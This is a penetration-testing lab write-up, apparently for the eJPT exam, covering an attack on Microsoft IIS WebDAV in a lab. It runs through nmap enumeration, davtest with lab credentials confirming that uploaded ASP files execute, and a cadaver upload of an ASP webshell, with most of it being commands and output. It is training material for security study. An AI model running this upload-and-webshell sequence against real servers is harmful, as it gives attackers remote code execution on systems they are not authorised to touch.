```jsx
Lab Name: Exploiting Microsoft IIS WebDAV
Platform: INE
Lab No: 11
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
┌──(root㉿INE)-[~]
└─# ping demo.ine.local
PING demo.ine.local (10.4.28.218) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.28.218): icmp_seq=1 ttl=125 time=10.6 ms
64 bytes from demo.ine.local (10.4.28.218): icmp_seq=2 ttl=125 time=9.71 ms
64 bytes from demo.ine.local (10.4.28.218): icmp_seq=3 ttl=125 time=9.68 ms
64 bytes from demo.ine.local (10.4.28.218): icmp_seq=4 ttl=125 time=10.1 ms
64 bytes from demo.ine.local (10.4.28.218): icmp_seq=5 ttl=125 time=9.58 ms
^C
--- demo.ine.local ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 9.576/9.928/10.569/0.368 ms
```

## NMAP Scan:

```console
┌──(root㉿INE)-[~]
└─# nmap demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 19:51 IST
Nmap scan report for demo.ine.local (10.4.28.218)
Host is up (0.011s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

```console
┌──(root㉿INE)-[~]
└─# nmap --script http-enum -sV -p 80 demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 19:51 IST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for demo.ine.local (10.4.28.218)
Host is up (0.0095s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)                           
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.40 seconds
```

## Exploitation:

```console
┌──(root㉿INE)-[~]
└─# davtest -auth bob:password_123321 -url http://demo.ine.local/webdav                                                                                                                                                                    
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://demo.ine.local/webdav
********************************************************
NOTE    Random string for this session: 4Scf6dNTJ
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ
********************************************************
 Sending test files
PUT     pl      SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.pl
PUT     asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.asp
PUT     txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.txt
PUT     jhtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.jhtml
PUT     cfm     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.cfm
PUT     aspx    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.aspx
PUT     html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.html
PUT     cgi     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.cgi
PUT     shtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.shtml
PUT     php     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.php
PUT     jsp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.jsp
********************************************************
 Checking for test file execution
EXEC    pl      FAIL
EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.asp
EXEC    asp     FAIL
EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.txt
EXEC    txt     FAIL
EXEC    jhtml   FAIL
EXEC    cfm     FAIL
EXEC    aspx    FAIL
EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.html
EXEC    html    FAIL
EXEC    cgi     FAIL
EXEC    shtml   FAIL
EXEC    php     FAIL
EXEC    jsp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.pl
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.asp
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.txt
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.jhtml
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.cfm
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.aspx
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.html
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.cgi
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.shtml
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.php
PUT File: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.jsp
Executes: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.asp
Executes: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.txt
Executes: http://demo.ine.local/webdav/DavTestDir_4Scf6dNTJ/davtest_4Scf6dNTJ.html
```

```console
┌──(root㉿INE)-[~]
└─# cadaver http://demo.ine.local/webdav
Authentication required for demo.ine.local on server `demo.ine.local':
Username: bob
Password: 
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_4Scf6dNTJ                   0  Aug 25 19:53
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
        webshell.asp                        1362  Aug 25 19:55
dav:/webdav/>
```

![image](https://github.com/user-attachments/assets/7c348ace-7f74-4309-9f57-2e40c3d95623)

---

![image](https://github.com/user-attachments/assets/61cfa226-4cd2-48ac-85e9-3715b4ee587a)

---
